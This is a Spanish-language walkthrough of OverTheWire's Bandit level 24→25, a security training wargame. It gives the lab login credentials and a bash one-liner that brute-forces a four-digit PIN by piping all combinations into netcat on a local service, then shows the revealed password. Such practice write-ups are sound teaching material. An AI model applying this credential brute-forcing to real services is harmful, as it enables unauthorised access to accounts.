# Bandit Level 24 → Level 25

## Objetivo de nivel
Un demonio está escuchando en el puerto 30002 y le dará la contraseña para Bandit25 si se le da la contraseña de Bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código pin, excepto pasando por todos los 10000 combinaciones, llamadas fuerza bruta.  
No es necesario crear nuevas conexiones cada vez

## Datos de acceso al nivel
``` bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Solución
``` bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
^C
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
## Notas adicionales
| comando | descripción |
| ------ | ------ |
| for | Se pueden realizar for en el bash |

## Referencias
